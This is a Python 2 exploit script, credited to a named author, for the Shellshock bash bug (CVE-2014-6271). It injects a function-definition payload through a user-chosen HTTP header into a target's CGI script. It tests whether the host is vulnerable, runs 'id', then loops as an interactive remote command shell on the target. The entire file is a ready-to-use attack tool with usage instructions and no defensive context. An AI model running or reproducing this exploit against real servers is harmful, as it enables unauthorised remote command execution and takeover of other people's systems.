#!/usr/bin/env/python
#
# CVE-2014-6271 Interactive Shell
#
# Written by Chema Garcia
#     @sch3m4
#     chema@safetybits.net || http://safetybits.net
#

import random
import string 
import httplib,urllib,sys

RSTRING_LEN = 20
AUX_RND_LEN = 128
HOST = None
PATH = None
HEADER = None
BINPATH = "PATH='/usr/local/bin:/usr/bin:/bin:/sbin/';"

def genExploit ( payload ):
	global BINPATH
	return "() { .;} ; echo; " + BINPATH + str(payload) + "; exit 0"

def sendRequest ( cmd ):
	global HOST
	global PATH
	global HEADER

	conn = httplib.HTTPConnection(HOST)
	headers = {"Content-type": "application/x-www-form-urlencoded",HEADER: genExploit( cmd ) }
	conn.request("GET",PATH,headers=headers)
	return conn.getresponse().read()

def sendCommand ( cmd ):
	aux = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(AUX_RND_LEN))
	resp = sendRequest ( 'echo ' + aux + '; ' + cmd + ' ; echo ' + aux )
	return resp.split(aux)[1]

def main():
	global HOST
	global PATH
	global HEADER

	print "CVE-2014-6271 Interactive Shell Exploit"
	print " by @sch3m4"
	print ""

	if (len(sys.argv)<4):
	        print "Usage: %s domain.tld /cgi-bin-path/file.ext header_name\n" % sys.argv[0]
	        print "Example: %s localhost /cgi-bin/test.cgi User-Agent\n" % sys.argv[0]
	        exit(0)

	HOST = sys.argv[1]
	PATH = sys.argv[2]
	HEADER = sys.argv[3]
	
	randstring = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(RSTRING_LEN))

	print "[i] Sending first request..."	
	ret = sendRequest ( 'echo ' + randstring )
	if not len(ret.split(randstring)) > 1:
		print "[:(] Host not vulnerable"
		exit(0)

	print "[}:-D] Host appears to be vulnerable!!\n"
	resp = sendCommand ( "id" )
	if resp is None:
		print "[e] Unexpected response!"
		exit(-1)
	print "$ id"
	print resp

	while True:
		try:
			cmd = raw_input ( "$ " )
			resp = sendCommand ( cmd )
			if resp is None:
				print "Unexpected response!"
				break
			print resp
		except KeyboardInterrupt:
			print ""
			break
		except Exception,e:
			print "[ERROR] Unhandled exception: %s" % e
			break

if __name__ == "__main__":
	main() 
